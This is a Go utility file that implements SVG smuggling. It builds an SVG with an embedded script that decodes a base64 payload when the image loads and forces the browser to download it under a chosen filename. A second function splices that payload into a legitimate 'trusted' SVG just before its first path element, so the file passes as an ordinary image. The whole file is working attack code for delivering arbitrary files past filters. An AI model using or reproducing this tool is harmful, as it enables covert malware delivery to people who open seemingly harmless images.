package utils

import (
	"bytes"
	"fmt"
	"html/template"
	"os"
	"strings"
)

const svgTemplate = `
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
     version="1.0" width="500" height="500">

    <script type="application/ecmascript"><![CDATA[
        document.addEventListener("DOMContentLoaded", function() {
            function base64ToArrayBuffer(base64) {
                var binary = window.atob(base64);
                var len = binary.length;
                var bytes = new Uint8Array(len);

                for (var i = 0; i < len; i++) {
                    bytes[i] = binary.charCodeAt(i);
                }

                return bytes.buffer;
            }

            var file = '{{.Base64}}';
            var data = base64ToArrayBuffer(file);

            var blob = new Blob([data], {type: 'application/octet-stream'});
            var a = document.createElementNS('http://www.w3.org/1999/xhtml', 'a');

            document.documentElement.appendChild(a);
            a.style.display = 'none';

            var url = window.URL.createObjectURL(blob);

            a.href = url;
            a.download = '{{.Filename}}';
            a.click();

            window.URL.revokeObjectURL(url);
        });
    ]]></script>
</svg>
`

type svgData struct {
	Base64   string
	Filename string
}

// Generate basic SVG ==========
func GenerateSVG(b64string, originalFilename string) (string, error) {
	tmpl, err := template.New("svg").Parse(svgTemplate)
	if err != nil {
		return "", fmt.Errorf("%w", err)
	}

	var buf bytes.Buffer

	data := svgData{
		Base64:   b64string,
		Filename: template.JSEscapeString(originalFilename),
	}

	if err := tmpl.Execute(&buf, data); err != nil {
		return "", fmt.Errorf("%w", err)
	}

	return buf.String(), nil
}

// Inject SVG into trusted SVG ==========
func GenerateTrustedSVG(trustedFile, b64string, originalFilename string) (string, error) {
	svgPayload, err := GenerateSVG(b64string, originalFilename)
	if err != nil {
		return "", err
	}

	data, err := os.ReadFile(trustedFile)
	if err != nil {
		return "", fmt.Errorf("%w", err)
	}

	text := string(data)

	const searchTag = "<path"

	index := strings.Index(text, searchTag)
	if index == -1 {
		return "", fmt.Errorf(
			"trusted SVG validation failed: no <path> element found",
		)
	}

	var builder strings.Builder
	builder.Grow(len(text) + len(svgPayload))

	builder.WriteString(text[:index])
	builder.WriteString(svgPayload)
	builder.WriteString(text[index:])

	return builder.String(), nil
}
